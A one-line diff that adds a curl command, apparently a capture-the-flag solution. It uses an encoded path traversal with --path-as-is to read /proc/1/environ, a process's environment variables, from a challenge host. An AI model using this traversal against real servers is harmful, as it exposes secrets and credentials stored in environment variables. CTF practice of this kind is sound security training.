@@ -1,0 +1,1 @@
+curl --output -  -X CONNECT -v --path-as-is 'http://dvd.chal.h4ck3r.quest:10001/static/%2E%2E/../proc/1/environ'
